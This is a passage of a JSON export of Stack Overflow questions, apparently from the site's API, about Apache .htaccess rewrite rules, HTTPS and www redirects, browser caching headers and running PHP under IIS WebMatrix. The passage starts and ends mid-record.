duplicate pages to be indexed, bleeding PageRank where old links no longer point to the correct URL, etc, etc.</p>\n\n<p>Anyway, I modeled the .htaccess after <a href=\"http://stackoverflow.com/questions/2079015/htaccess-301-redirect-for-all-https-to-http-except-one-page\">another post on here</a> that seemed to almost fit the bill, but I wanted to run it by the experts here to make sure that the file looked correct.</p>\n\n<p>Basically, ALL pages on the site need to be redirected back to HTTP from HTTPS except a handful of html pages, some .php pages, and a .cgi script. Can you tell me if there's an easy rule to set all php pages to be HTTPS, and then set a few additional HTML pages behind HTTPS and a .cgi script? I'd really appreciate it. Here's what I've got so far:</p>\n\n<pre><code>IndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti*\n\n&lt;Limit GET POST&gt;\norder deny,allow\ndeny from all\nallow from all\n&lt;/Limit&gt;\n&lt;Limit GET POST&gt;\norder deny,allow\ndeny from all\n&lt;/Limit&gt;\nAuthName thedomain.com\nAuthUserFile /home/thesitename/public_html/_vti_pvt/service.pwd\nAuthGroupFile /home/thesitename/public_html/_vti_pvt/service.grp\n\nRewriteEngine On\nRewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} page1.html\nRewriteCond %{REQUEST_URI} page2.html\nRewriteCond %{REQUEST_URI} page3.html\nRewriteCond %{REQUEST_URI} page4.html\nRewriteCond %{SCRIPT_FILENAME} \\/page\\.php [NC]\nRewriteCond %{SCRIPT_FILENAME} \\/page\\.php [NC]\nRewriteCond %{SCRIPT_FILENAME} \\/page\\.php [NC]\nRewriteCond %{SCRIPT_FILENAME} \\/page\\.php [NC]\nRewriteCond %{SCRIPT_FILENAME} \\/page\\.php [NC]\nRewriteCond %{SCRIPT_FILENAME} \\/page\\.php [NC]\nRewriteRule ^(.*)$ https://%{SERVER_NAME}%{REQUEST_URI} [R=301]\n\nRewriteCond %{HTTPS} on\nRewriteCond %{REQUEST_URI} !(auth|register|secure)\nRewriteCond %{REQUEST_URI} !originalpage.php\nRewriteCond %{REQUEST_URI} !cgi-script.cgi\nRewriteRule ^(.*)$ http://%{SERVER_NAME}%{REQUEST_URI} [R=301]\n</code></pre>\n"},{"tags":["php","html",".htaccess","web-config"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12667677,"title":"embed php in html page in windows webmatrix2 server","body":"<p>I am trying to embed php code in my html pages on my godaddy linux hosted site.\nI am aware of howtos that will instruct me how to do this on godaddy by editing my\n.htaccess file.</p>\n\n<p>My problem is that I want to develop <strong>locally under windows webmatrix2.</strong></p>\n\n<p>What needs to be done under a windows server running iis or webmatrix as server?\n My godaddy account is hosted under linux but I develop under windows using webmatrix.</p>\n\n<p>Solutions I have found that don't work.</p>\n\n<p>1) According to one source add these lines to the <strong>applicationhost.config</strong> file</p>\n\n<pre><code>&lt;add name=\"PHP53_via_FastCGI_html\" path=\"*.html\" \n   verb=\"GET,HEAD,POST\" modules=\"FastCgiModule\" \n   scriptProcessor=\"C:\\Program Files (x86)\\iis express\\PHP\\v5.3\\php-cgi.exe\"\n   resourceType=\"Either\" /&gt;\n</code></pre>\n\n<p>under the iisexpress directory. They crash my entire local site.</p>\n\n<p>2)  In Webmatrix, In the <strong>web.config</strong> file for the site add in this rewrite rule.</p>\n\n<pre><code>&lt;system.webServer&gt;\n  &lt;rewrite&gt;\n    &lt;rules&gt;\n        &lt;rule name=\"REWRITE_TO_PHP\"&gt;\n        &lt;match url=\".html\" /&gt;\n        &lt;conditions logicalGrouping=\"MatchAll\" /&gt;\n\n        &lt;action type=\"Rewrite\" url=\".php\" /&gt;\n            &lt;/rule&gt;\n    &lt;/rules&gt;\n&lt;/rewrite&gt;\n... more code \n</code></pre>\n\n<p>3) or try this in <strong>web.config</strong></p>\n\n<pre><code>&lt;rewrite&gt;\n    &lt;rules&gt;\n\n        &lt;rule name=\"REWRITE_TO_PHP\"&gt;\n        &lt;match url=\"*.html\" /&gt;\n        &lt;conditions logicalGrouping=\"MatchAll\" /&gt;\n        &lt;action type=\"Rewrite\" url=\"{\"*.Php\"} /&gt;\n\n    &lt;/rule&gt;\n&lt;/rewrite&gt;\n</code></pre>\n\n<p>4) or  try this in <strong>web.config</strong></p>\n\n<pre><code>&lt;handlers&gt;\n&lt;add name=\"html via php cgi\" path=\"*.html\" verb=\"*\" modules=\"FastCgiModule\" \nscriptProcessor=\"C:\\Program Files\\Php\\php-cgi.exe\" \nresourceType=\"Unspecified\" /&gt;\n&lt;/handlers&gt; \n</code></pre>\n\n<p>None of the above work for me.\nI know all of the above this is a lot of information. This is all I have been able to find in lengthy web searches. I am not a system coder by experience. I just need something\nthat works that will allow me to start coding php in html on windows. The key breakthrough\nwill be if I start seeing my php displying in keyword colors and have webtrix intellisense\nwork! <strong>Intellisense is great!</strong>\nThank you.</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12286086,"title":"Session variable being dropped when using rewriteRule in .htaccess","body":"<p>I have a strange thing happening.  If I go to my site's main landing page, then click through and add a product to the shopping cart, a PHP session variable called 'cartID' is saved. That way a customer can continue to add items to their cart without losing their cart items.</p>\n\n<p>If I bypass the main landing page and go straight to a product page (like via a bookmark or google search), then add that item to the shopping cart, although the session variable 'cartID' is created, once the customer leaves the cart page, the 'cartID' variable is lost...which empties their cart.</p>\n\n<p>Both methods of adding an item(s) to the cart use a rewriteRule in .htaccess:</p>\n\n<blockquote>\n  <p>RewriteRule ^g(.<em>)c(.</em>)s(.<em>)ss(.</em>)p(.<em>)/(.</em>).htm$ onlineOrder.php?grpid=$1&amp;catSel=$2&amp;subCat1ID=$3&amp;subCat2ID=$4&amp;prodSel=$5&amp;$6 [QSA]</p>\n</blockquote>\n\n<p>Which works fine, but the 'cartID' session variable created once an item is added to the shopping cart will get lost when leaving the cart page if the customer didn't go to the main landing page first.  Even though both links to the product page are the exact same.</p>\n\n<p>Any idea as to why it doesn't work if going straight to a product page?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12774090,"title":"Apache mod_rewrite ignores periods and extra slashes","body":"<p>Here's my .htaccess:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\n\nRewriteRule ^[0-9]+(/)?$ /hello.php [R=301]\n</code></pre>\n\n<p>localhost/123 redirects to localhost/hello.php as expected.</p>\n\n<p>But:\nlocalhost/123.... and localhost////123//// also redirect to localhost/hello.php.</p>\n\n<p>What's going on? </p>\n"},{"tags":[".htaccess","codeigniter","url-rewriting","codeigniter-url"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13018431,"title":"How to remove application folder name in code igniter","body":"<pre><code>    &lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #When your application folder isn't in the system folder\n    #This snippet prevents user access to the application folder\n    #Submitted by: Fabdrol\n    #Rename 'application' to your applications folder name.\n    RewriteCond %{REQUEST_URI} ^main.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n\n    RewriteCond %{HTTP_HOST} .\n\nRewriteCond %{HTTP_HOST} !^www.domain.com [NC]\n\nRewriteRule (.*) http://www.domain.com/$1 [R=301,L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n    # Submitted by: ElliotHaughin\n\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Currently the URLs are showing up as <a href=\"http://www.domain.com/main/home\" rel=\"nofollow\">http://www.domain.com/main/home</a> but I would rather have it appear as <a href=\"http://www.domain.com/home\" rel=\"nofollow\">http://www.domain.com/home</a>. How can I change that?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13022738,"title":".htaccess point subdomain to file","body":"<p>What I am trying to do is be able to point something like <code>username.domain.com</code> to <code>index.php?url=username</code>. I have been browsing around Google/StackOveflow and have not been able to find anything that will benefit me.</p>\n\n<p>Best Regards.</p>\n"},{"tags":["php","mysql",".htaccess"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13022825,"title":".htaccess redirect with mysql content in url","body":"<p>I have URL's like so</p>\n\n<p>mysite.com/view.php?id=123</p>\n\n<p>I have changed the URL's to look like this with .htaccess</p>\n\n<p>mysite.com/123/page-title.html</p>\n\n<p>Now, since the \"page-title\" part wasn't part of the original URL, and is information from a mysql table that corresponds to the id \"123\", how can I 301 redirect the old URL's to the new URL's ?</p>\n\n<p>Surely there must be some PHP involved, but I don't know how to write that in .htaccess...</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13022260,"title":"htaccess https www (only) to https non-www (only)","body":"<p>How can I rewrite all traffic using \"https\" and \"www\" to \"https\" without the \"www\". I do not want any rewrites done on non-ssl traffic (besides the existing code below). I also already have a rewrite for clean urls going on at the same time. The SSL cert is purchased on the non-www URL which is why I am asking how to do this.</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php)\nRewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n\n<p>Thanks for your time.</p>\n\n<p>[EDIT]</p>\n\n<p>Ended up getting this to work:</p>\n\n<pre><code>RewriteCond %{HTTPS} on\nRewriteCond %{HTTP_HOST} ^www.mysite.com$ [NC]\nRewriteRule ^(.*)$ https://mysite.com/$1 [L,R=301]\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect","debian"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13021893,"title":"htaccess mod_rewrite hostname","body":"<p>How can i rewrite the domain url to a specific domain name if it didnt match it ..</p>\n\n<p>Let's say i want it to only match example.com\nand the visitor came from server ip (http://127.0.0.1/something/else) OR came from another domain (http://domain.com/something/else) <br></p>\n\n<p>how can i rewrite the domain name and keep all the other parameters, just domain name to example.com ( result should be : <a href=\"http://example.com/somthing/else\" rel=\"nofollow\">http://example.com/somthing/else</a> )</p>\n"},{"tags":["apache",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13021465,"title":".htaccess Redirect Issue","body":"<p>I've got the following redirect code in my .htaccess file and the redirect is working when I access the domain without www. but won't work with www. </p>\n\n<pre><code>RewriteOptions inherit\nRewriteEngine on\n\nRewriteCond %{HTTP_HOST} ^design-a-wedding.com.au$ [OR]\nRewriteCond %{HTTP_HOST} ^www.design-a-wedding.com.au$\nRewriteRule ^/?$ \"http\\:\\/\\/portmacquarieweddingcelebrant\\.com\\.au\" [R=301,L]\n</code></pre>\n\n<p>The weird thing is I've used this redirect before on other domains and haven't had a problem.</p>\n\n<p>Any help would be appreciated. </p>\n"},{"tags":[".htaccess","caching"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13021195,"title":"Chrome says that resources are non-cacheable though I they are, ignore or do something?","body":"<p>So chrome tells me \"The following resources are explicitly non-cacheable\" regarding style.css and scripts.js</p>\n\n<p>I have this rule in my .htaccess making them expire in a day (all other files have cache control public expiration):</p>\n\n<pre><code>...\nExpiresActive On\nExpiresDefault \"access plus 1 year\"\nHeader unset Last-Modified\nHeader set Cache-Control \"public\"\n&lt;FilesMatch \".(css|js)$\"&gt;\nHeader set Expires \"access plus 1 day\"\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>Chrome tells me cache isn't public if I add a rule for .css and .js and that those files aren't being cached, if I remove the rule it doesn't. My question is basically whether I should ignore Chrome's alert or if really my files aren't being cached. </p>\n"},{"tags":[".htaccess","redirect","lamp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12699304,"title":"Redirect a subdomains traffic from the root domain","body":"<p>I would like to:\n301 Redirect a subdomain's traffic from the root domain without keeping the subdomain intact.<br>\nExample:\nI want to place something in the htaccess file of example.com so all the traffic that would normally go to blog.example.com would now go to (ideally) example.com/blog/ (or example.com/blog2/ if the former can't happen).</p>\n\n<p>Is this even possible or would I have to leave the subdomain name intact to use htaccess and a 301 to redirect?</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":89,"score":1,"question_id":13007152,"title":".htaccess, multiple domains, non-www, force trailing slash, all redirect to PHP script","body":"<p>A challenge for some altruistic uber htaccess wizard gentleman:</p>\n\n<p>I have been chipping away at a htaccess file for a new site I am working on and just can't crack it.  I have each segment working independently - but just cant get them all working together.  I am generating the site based on PHP REQUEST_URI.  Multiple domains are pointed at the same directory so it has to function for multiple domains.  I am trying to accomplish:</p>\n\n<ol>\n<li>multiple domains pointed at same directory,</li>\n<li>force non-www,</li>\n<li>force trailing slash without extension, and</li>\n<li>redirect all non-existent to a specific script</li>\n</ol>\n\n<p>Essentially:</p>\n\n<p><a href=\"http://www.example.com/dog/cat\" rel=\"nofollow\">http://www.example.com/dog/cat</a> -> 301 shows as -> <a href=\"http://example.com/dog/cat/\" rel=\"nofollow\">http://example.com/dog/cat/</a> ->but silently redirects to -> <a href=\"http://example.com/script.php\" rel=\"nofollow\">http://example.com/script.php</a></p>\n\n<p>OR</p>\n\n<p><a href=\"http://www.example.com/dog/cat/pig/bird/walrus\" rel=\"nofollow\">http://www.example.com/dog/cat/pig/bird/walrus</a> -> 301 shows as -> <a href=\"http://example.com/dog/cat/pig/bird/walrus/\" rel=\"nofollow\">http://example.com/dog/cat/pig/bird/walrus/</a> -> silently redirects to -> <a href=\"http://example.com/script.php\" rel=\"nofollow\">http://example.com/script.php</a></p>\n\n<p>OR</p>\n\n<p><a href=\"http://www.example.com/dog/cat.html\" rel=\"nofollow\">http://www.example.com/dog/cat.html</a> -> 301 shows as -> <a href=\"http://example.com/dog/cat/\" rel=\"nofollow\">http://example.com/dog/cat/</a> -> silently redirects to -> <a href=\"http://example.com/script.php\" rel=\"nofollow\">http://example.com/script.php</a></p>\n\n<p>OR</p>\n\n<p><a href=\"http://www.example.com/dog.php\" rel=\"nofollow\">http://www.example.com/dog.php</a> -> 301 shows as -> <a href=\"http://example.com/dog/\" rel=\"nofollow\">http://example.com/dog/</a> -> silently redirects to <a href=\"http://example.com/script.php\" rel=\"nofollow\">http://example.com/script.php</a></p>\n\n<p>Thus far I have worked with the following snippets(from memory so forgive me):</p>\n\n<p>Non-www:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^www\\.(.*)$ [NC]\nRewriteRule ^(.*)$ http://%1/$1 [R=301,L]\n</code></pre>\n\n<p>Strip trailing slash:</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} !(.*)/$\nRewriteRule ^(.*)$ http://%{HTTP_HOST}/$1/ [L,R=301]\n</code></pre>\n\n<p>All non-existent to script:</p>\n\n<pre><code>RewriteCond %{SCRIPT_FILENAME} !-d\nRewriteCond %{SCRIPT_FILENAME} !-f\nRewriteRule ^.*/$ ./script.php [L]\n</code></pre>\n\n<p>I have had issues with specific parts not functioning at all, to recursive effects, etc.  I don't love asking for help, and I have done my best to do my homework, but I just can't figure this one out.</p>\n\n<p>I have found similar questions here, such as:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/4410830/htaccess-add-trailing-slash-and-force-www-with-clean-urls\">htaccess add trailing slash and force www with clean urls</a></p>\n\n<p>Any help is greatly appreciated!</p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>So I have continued fiddling with the .htaccess file.  I added a comment below the question to the effect that I was having trouble with Firefox's \"wonderful\" address bar search feature redirecting the domain name to search when the domain was non-www and non-trailing slash.  Because of this, I changed my scheme to still be consistent (preventing duplicates) but do the opposite: force www and trailing slash.</p>\n\n<p>The following code produces results near what I am looking for:</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine On\nRewriteBase /\n\n#Redirect Forcing trailing slash\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule .*[^/]$ /$0/ [L,R=301]\n\n#Redirect non-www to www\nRewriteCond %{HTTP_HOST} !^www\\. [NC]\nRewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]\n\n#Redirect to script\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^.*$ script.php [L]\n</code></pre>\n\n<p>I still need the extension dropped off of non-existent files, i.e.:</p>\n\n<p>www.example.com/cats.html -> www.example.com/cats/</p>\n\n<p>Any advice would mean the world...</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":26,"score":0,"question_id":13018031,"title":"Htaccess Redirect from subdirectory to root [SOLVED]","body":"<p>I'm looking for a htaccess code to redirect my url's like this :</p>\n\n<pre><code>http://01.mydomain.com/subdir/xyz [OR]\nhttp://www.01.mydomain.com/subdir/xyz [OR]\nhttp://02.mydomain.com/subdir/xyz [OR]\nhttp://www.02.mydomain.com/subdir/xyz\nTO : http://www.mydomain.com/xyz\n</code></pre>\n\n<p>and in this case <code>xyz</code> is dynamic and could be any value. and <code>subdir</code> is constant</p>\n\n<p>thanks for any help in advance.</p>\n"},{"tags":["php","security",".htaccess","ip"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12988408,"title":"Can I use PHP to limit a page only on a set of IPs?","body":"<p>I have a folder which contains an admin panel - no password or session management is on the script. The URL is complex to get too. To save time before making an admin login system. Can I restrict a folder and all sub folders and files via .<code>htaccess</code> or should I make a PHP include which checks an Array list of IPs and then just does <code>die()</code> or redirect <code>Header()</code> to external source?</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13019339,"title":"htacces rewriterule not working for base url","body":"<p>I'm trying to get these rewrite rules to work but I can't seem to get the ones that just go to index.php to work. The site is www.byurook.com.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n    RewriteRule ^en$ /index.php?lang=en_US [L] \n    RewriteRule ^en/$ /index.php?lang=en_US [L] \n    RewriteRule ^ko$ /index.php?lang=ko_KR [L] \n    RewriteRule ^ko/$ /index.php?lang=ko_KR [L] \n    RewriteRule ^en/(.*)$ $1?lang=en_US\n    RewriteRule ^ko/(.*)$ $1?lang=ko_KR\n    RewriteRule ^index\\.php$ - [L] \n    RewriteCond %{REQUEST_FILENAME} !-f \n    RewriteCond %{REQUEST_FILENAME} !-d \n    RewriteRule . /index.php [L] \n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","expressionengine","environments"],"answer_count":2,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":88,"score":5,"question_id":12886683,"title":".htaccess in Multiple Environments","body":"<p>I know similar questions have been asked before but I haven't found any really specific answers for my situation.</p>\n\n<p>I have an ExpressionEngine site running on multiple environments (local, dev, production), and each of those environments needs different .htaccess rules:</p>\n\n<p><strong>All Environments</strong></p>\n\n<ul>\n<li><a href=\"http://expressionengine.com/user_guide/general/remove_index.php.html\">Remove index.php</a></li>\n<li>Set a 404 file</li>\n<li>Set 301 Redirects</li>\n</ul>\n\n<p><strong>Development</strong></p>\n\n<ul>\n<li>Password Protect with .htpasswd</li>\n<li>Force HTTPS protocol</li>\n<li>Prevent search engine indexing with <a href=\"http://yoast.com/prevent-site-being-indexed/\">X-Robots-Tag</a></li>\n</ul>\n\n<p><strong>Production</strong></p>\n\n<ul>\n<li>Force HTTPS protocol</li>\n<li>Redirect non-www subdomains to www</li>\n</ul>\n\n<p><strong>Local</strong></p>\n\n<ul>\n<li>No unique rules.</li>\n</ul>\n\n<p>I've seen a lot of examples of how you can set specific environments per-module. Like <code>RewriteCond %{REQUEST_HOST} ^dev.myurl.com</code> for the mod_rewrite module, and <a href=\"http://css-tricks.com/snippets/htaccess/allow-single-url/\">tricks like this</a> for .htpasswd requirements.</p>\n\n<p>But what I would really prefer is some way to set global environment variables, then re-use those variables in the .htaccess file per-environment. To use pseudo-javascript as an example, something like:</p>\n\n<pre><code>var local = 'mysite.local';\nvar development = 'dev.mysite.com';\nvar production = 'www.mysite.com';\n\n// Global .htaccess rules\n\nif(environment == local){\n   // Local environment .htaccess rules\n}\n\nif(environment == development){\n   // Development environment .htaccess rules\n}\n\nif(environment == production){\n   //Production envirotnment .htaccess rules\n}\n</code></pre>\n\n<p>This way all of the environment-specific rules are all grouped together, making a really clean file, and only one variable needs to be changed if an environment is changed.</p>\n\n<p>I've seen a few references to altering settings in Apache's config files, but obviously that's not a viable option if I'm dealing with 3rd-party hosts.</p>\n\n<p>So is this pie-in-the-sky wishful thinking, or can it be done?</p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":53,"score":-1,"question_id":13014137,"title":"how to redirect all subdomains to one file but let files that exist load","body":"<p>so i have a domain.com, i want to make all subdomains to redirect to blog system im making</p>\n\n<p>so domain.com - main website (not blog, loaded by index.php)\nanything.domain.com - blog website -> everything redirected to blogs.php in main directory (same as index.php)</p>\n\n<p>now to acomplish this i use:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^([a-z0-9_]+\\.)domain.com$ [NC]\nRewriteRule (.*) blogs.php [QSA,L]\n</code></pre>\n\n<p>and more or less it works (i use nice urls - get actual $_GET table extracted from $_SERVER[request_uri]</p>\n\n<p>but, what i need on top of it is to be able to link files to existing directories like:\n<a href=\"http://someblog.domain.com/js/somefile.js\" rel=\"nofollow\">http://someblog.domain.com/js/somefile.js</a>\nnow its trying to load blogs.php with /js/somefile.js as parameter</p>\n\n<p>i tried to add:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n</code></pre>\n\n<p>but with it - it always open main website (since every subdomain is redirected to main domain and act as existing dir/file)</p>\n\n<p>so to sum up:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^[*]+\\.domain.com (xxx)! [NC] \n//in place of xxx - somehow check if there is anything after adderess\nRewriteCond %{REQUEST_FILENAME} !-f  // and check if it exists\nRewriteCond %{REQUEST_FILENAME} !-d  //\n</code></pre>\n\n<p>if exists - server it, if not follow to old one that silently translates requests to blogs.php:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^([a-z0-9_]+\\.)gragieldowa.pl$ [NC]\n\nRewriteRule (.*) blogs.php [QSA,L]\n</code></pre>\n\n<p>thanks in advance for any help:)</p>\n"},{"tags":[".htaccess","mod-rewrite","rewrite","rule"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13010153,"title":"mod_rewrite rewrite url using .htaccess","body":"<p>I have searched on google and here for a tutorial to help me rewrite my urls.\nI would like somebody to explain what I must write and why.</p>\n\n<p>I have this url:</p>\n\n<pre><code>http://iescup.eu/tournaments.php?tourney[id]=1\nhttp://iescup.eu/tournaments.php?tourney[id]=2\nhttp://iescup.eu/tournaments.php?tourney[id]=3\n</code></pre>\n\n<p>and so on</p>\n\n<p>I would like to have this url:</p>\n\n<pre><code>http://iescup.eu/#!/tourneys/1\nhttp://iescup.eu/#!/tourneys/2\nhttp://iescup.eu/#!/tourneys/3\n</code></pre>\n\n<p>and so on</p>\n\n<p>Sincerely\nRune Naundrup Dahl</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting","escaping"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":13015172,"title":"apache mod_rewrite currency","body":"<p>I was wondering if anyone can help. I have a redirect file set to point the customers to specific pages when they search on the site for specific words. This is all working fine with similar below rules apart from when i try to pass a GBP currency sign (£) in to the search string, so for instance if I wanted to send the customer to a page called 'http://www.mysite.com/offers/3-for-20.list' when they search for '3 for £20' i have got the below rule set up :-</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} ^search\\=(3\\+for\\+£20)$ [NC]\nRewriteRule ^.* http://www.mysite.com/offers/3-for-20.list?s=%1 [L,R=301]\n</code></pre>\n\n<p>I have tried the above without success and have been unable to find anything to help or any escape characters that will help me with this.\nI am not getting any errors pages appear infact it is completing the search successfully but not pointing to the page requested insteadjust doing a query as if there is no redirect set up, plus the log files shows no errors but has a search result of '...search=3+for+%C2%A320' HTTP/1.1 200</p>\n\n<p>I have also tried to put the above in to the redirect rule with the same results i.e. </p>\n\n<pre><code>RewriteCond %{QUERY_STRING} ^search\\=(3\\+for\\+C2%A320)$ [NC]\nRewriteRule ^.* http://www.mysite.com/offers/3-for-20.list?s=%1 [L,R=301]\n</code></pre>\n\n<p>Does anyone have any ideas on how I can do this.</p>\n\n<p>Thanks for your help.</p>\n"},{"tags":["php",".htaccess","browser-cache"],"answer_count":3,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":2585,"score":2,"question_id":6878427,"title":"Leverage browser caching, how on apache or .htaccess?","body":"<p>Not sure what to do here?? I have a huge list of files that  Google Speed Page said to \"Leverage Browser Caching\".. but I don't know how? Do I mess or change the Apache config file (below) or do I put something in my .htaccess page?</p>\n\n<p>Thanks so much!!</p>\n\n<pre><code> &lt;IfModule mod_proxy.c&gt;\n        ProxyRequests Off\n        CacheRoot \"/var/run/proxy\"\n        CacheSize 1024\n        CacheGcInterval 24\n    #CacheMaxExpire 24\n    #CacheLastModifiedFactor 0.1\n    #CacheDefaultExpire 1\n    #NoCache a_domain.com another_domain.edu joes.garage_sale.com\n        &lt;Directory \"disabled_proxy\"&gt;\n            Allow from example.com\n            Deny from all\n            Order Deny,Allow\n        &lt;/Directory&gt;\n    &lt;/IfModule&gt;\n    ##\n    #### mod_expires is configured so that all static files but images\n    #### expire after 60 seconds. Any response that has a life span of more\n    #### than 5 seconds (see webperfcache.conf) will be cached by webperfcache.\n    #### Make sure your CGIs return a \"Cache-Control: no-cache\" header if you\n    #### elect to make your dynamically generated HTML pages not cache-able.\n    #### If all your HTML pages are static you may also increase ExpiresDefault.\n\n    &lt;IfModule mod_expires.c&gt;\n        ExpiresActive On\n        ExpiresDefault A60\n        ExpiresByType image/bmp A3600\n        ExpiresByType image/gif A3600\n        ExpiresByType image/ief A3600\n        ExpiresByType image/jpeg A3600\n        ExpiresByType image/png A3600\n        ExpiresByType image/tiff A3600\n        ExpiresByType image/x-cmu-raster A3600\n        ExpiresByType image/x-portable-anymap A3600\n        ExpiresByType image/x-portable-bitmap A3600\n        ExpiresByType image/x-portable-graymap A3600\n        ExpiresByType image/x-portable-pixmap A3600\n        ExpiresByType image/x-rgb  A3600\n        ExpiresByType image/x-xbitmap A3600\n        ExpiresByType image/x-xpixmap A3600\n        ExpiresByType image/x-xwindowdump A3600\n        ExpiresByType audio/basic A3600\n        ExpiresByType audio/midi A3600\n        ExpiresByType audio/mpeg A3600\n        ExpiresByType audio/x-aiff A3600\n        ExpiresByType audio/x-pn-realaudio A3600\n        ExpiresByType audio/x-pn-realaudio-plugin A3600\n        ExpiresByType audio/x-realaudio A3600\n        ExpiresByType audio/x-wav A3600\n        ExpiresByType video/mpeg A3600\n        ExpiresByType video/quicktime A3600\n        ExpiresByType video/x-msvideo A3600\n        ExpiresByType video/x-sgi-movie A3600\n    &lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["php","mysql","authentication",".htaccess","passwords"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1337,"score":0,"question_id":2351791,"title":"Password protect an entire directory with PHP authentication","body":"<p>I want to password protect an entire directory and authenticate users though a MySQL database using PHP. I know you can password protect directories using .htaccess but I can't seem to find out how to use PHP and MySQL along with that.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":112,"score":2,"question_id":11832339,"title":".htaccess non-www redirect creating error 404?","body":"<p>Error: The requested URL /public_html/ was not found on this server.</p>\n\n<p>Instead of going to <a href=\"http://www.mywebsite.com/\" rel=\"nofollow\">http://www.mywebsite.com/</a>, my 301 redirect in the .htaccess file is sending the browser to <a href=\"http://www.mywebsite.com/public_html/\" rel=\"nofollow\">http://www.mywebsite.com/public_html/</a> and throwing that error.</p>\n\n<p>This may have something to do with the fact that I am hosting an add-on domain in a subdirectory? The issue only comes up when using InMotion.com hosting, the same code works fine on a page I am hosting on Bluehost.</p>\n\n<p>.htaccess code:</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine On\nRewriteCond %{http_host} ^mywebsite.com [NC]\nRewriteRule ^(.*)$ http://www.mywebsite.com/$1 